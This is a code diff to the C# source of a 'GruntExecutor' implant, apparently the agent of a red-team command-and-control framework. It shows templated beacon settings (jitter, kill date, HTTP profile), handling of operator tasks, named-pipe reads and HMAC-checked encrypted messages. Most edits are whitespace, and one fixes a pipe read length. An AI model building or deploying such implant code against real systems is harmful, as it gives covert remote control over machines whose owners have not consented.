@@ -578,12 +578,12 @@ namespace GruntExecutor
                 int Jitter = Convert.ToInt32(@"{{REPLACE_JITTER_PERCENT}}");
                 int ConnectAttempts = Convert.ToInt32(@"{{REPLACE_CONNECT_ATTEMPTS}}");
                 DateTime KillDate = DateTime.FromBinary(long.Parse(@"{{REPLACE_KILL_DATE}}"));
-				List<string> ProfileHttpHeaderNames = @"{{REPLACE_PROFILE_HTTP_HEADER_NAMES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
+                List<string> ProfileHttpHeaderNames = @"{{REPLACE_PROFILE_HTTP_HEADER_NAMES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
                 List<string> ProfileHttpHeaderValues = @"{{REPLACE_PROFILE_HTTP_HEADER_VALUES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
-				List<string> ProfileHttpUrls = @"{{REPLACE_PROFILE_HTTP_URLS}}".Split(',').ToList().Select(U => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList();
-				string ProfileHttpGetResponse = @"{{REPLACE_PROFILE_HTTP_GET_RESPONSE}}".Replace(Environment.NewLine, "\n");
-				string ProfileHttpPostRequest = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}".Replace(Environment.NewLine, "\n");
-				string ProfileHttpPostResponse = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}".Replace(Environment.NewLine, "\n");
+                List<string> ProfileHttpUrls = @"{{REPLACE_PROFILE_HTTP_URLS}}".Split(',').ToList().Select(U => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList();
+                string ProfileHttpGetResponse = @"{{REPLACE_PROFILE_HTTP_GET_RESPONSE}}".Replace(Environment.NewLine, "\n");
+                string ProfileHttpPostRequest = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}".Replace(Environment.NewLine, "\n");
+                string ProfileHttpPostResponse = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}".Replace(Environment.NewLine, "\n");
                 bool ValidateCert = bool.Parse(@"{{REPLACE_VALIDATE_CERT}}");
                 bool UseCertPinning = bool.Parse(@"{{REPLACE_USE_CERT_PINNING}}");
 
@@ -700,7 +700,7 @@ namespace GruntExecutor
                                 messenger.WriteTaskingMessage();
                                 return;
                             }
-                            else if(message.Type == GruntTaskingType.Tasks)
+                            else if (message.Type == GruntTaskingType.Tasks)
                             {
                                 if (!Tasks.Where(T => T.Value.IsAlive).Any()) { output += "No active tasks!"; }
                                 else
@@ -711,7 +711,7 @@ namespace GruntExecutor
                                 }
                                 messenger.QueueTaskingMessage(new GruntTaskingMessageResponse(GruntTaskingStatus.Completed, output).ToJson(), message.Name);
                             }
-                            else if(message.Type == GruntTaskingType.TaskKill)
+                            else if (message.Type == GruntTaskingType.TaskKill)
                             {
                                 var matched = Tasks.Where(T => T.Value.IsAlive && T.Key.ToLower() == message.Message.ToLower());
                                 if (!matched.Any())
@@ -1376,7 +1376,7 @@ namespace GruntExecutor
                 int readBytes = 0;
                 do
                 {
-                    readBytes = this.Pipe.Read(buffer, 0, buffer.Length);
+                    readBytes = this.Pipe.Read(buffer, 0, Math.Min(len - totalReadBytes, buffer.Length));
                     ms.Write(buffer, 0, readBytes);
                     totalReadBytes += readBytes;
                 } while (totalReadBytes < len);
@@ -1636,12 +1636,12 @@ namespace GruntExecutor
             Tasking
         }
 
-		public string GUID { get; set; } = "";
+        public string GUID { get; set; } = "";
         public GruntEncryptedMessageType Type { get; set; }
         public string Meta { get; set; } = "";
-		public string IV { get; set; } = "";
-		public string EncryptedMessage { get; set; } = "";
-		public string HMAC { get; set; } = "";
+        public string IV { get; set; } = "";
+        public string EncryptedMessage { get; set; } = "";
+        public string HMAC { get; set; } = "";
 
         public bool VerifyHMAC(byte[] Key)
         {
@@ -1801,7 +1801,7 @@ namespace GruntExecutor
             if (format.Contains("{5}")) { format = format.Replace("{5}", "(?'group5'.*)"); }
             Match match = new Regex(format).Match(data);
             List<string> matches = new List<string>();
-			if (match.Groups["group0"] != null) { matches.Add(match.Groups["group0"].Value); }
+            if (match.Groups["group0"] != null) { matches.Add(match.Groups["group0"].Value); }
             if (match.Groups["group1"] != null) { matches.Add(match.Groups["group1"].Value); }
             if (match.Groups["group2"] != null) { matches.Add(match.Groups["group2"].Value); }
             if (match.Groups["group3"] != null) { matches.Add(match.Groups["group3"].Value); }
